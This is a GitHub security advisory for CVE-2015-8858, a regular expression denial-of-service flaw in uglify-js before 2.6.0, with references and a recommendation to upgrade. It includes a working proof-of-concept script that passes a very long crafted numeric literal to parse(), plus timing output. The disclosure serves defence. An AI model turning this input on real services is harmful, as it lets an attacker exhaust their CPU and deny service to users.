# [H] Regular Expression Denial of Service in uglify-js

## Summary
Severity: High
Advisory: GHSA-c9f4-xj24-8jqx
CVE: CVE-2015-8858
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2017-10-24
Source: https://github.com/advisories/GHSA-c9f4-xj24-8jqx
Type: github-advisory

## Affected
- npm: `uglify-js` — affected >=0 <2.6.0

## Details
Versions of `uglify-js` prior to 2.6.0 are affected by a regular expression denial of service vulnerability when malicious inputs are passed into the `parse()` method.


### Proof of Concept

```
var u = require('uglify-js');
var genstr = function (len, chr) {
    var result = "";
    for (i=0; i<=len; i++) {
        result = result + chr;
    }

    return result;
}

u.parse("var a = " + genstr(process.argv[2], "1") + ".1ee7;");
```

### Results
```
$ time node test.js 10000
real	0m1.091s
user	0m1.047s
sys	0m0.039s

$ time node test.js 80000
real	0m6.486s
user	0m6.229s
sys	0m0.094s
```


## Recommendation

Update to version 2.6.0 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2015-8858
- https://github.com/advisories/GHSA-c9f4-xj24-8jqx
- https://www.npmjs.com/advisories/48
- http://www.openwall.com/lists/oss-security/2016/04/20/11
- http://www.securityfocus.com/bid/96409
